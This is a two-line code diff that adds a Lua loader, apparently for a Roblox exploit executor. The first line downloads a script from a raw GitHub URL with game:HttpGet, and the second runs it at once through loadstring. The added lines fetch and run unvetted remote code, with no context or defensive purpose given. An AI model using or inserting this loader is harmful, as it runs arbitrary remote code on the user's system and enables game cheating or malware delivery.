@@ -1,0 +1,2 @@
+local code = game:HttpGet('https://raw.githubusercontent.com/Jayfrr/Erazedsa/refs/heads/main/erazedsa')
+loadstring(code)()
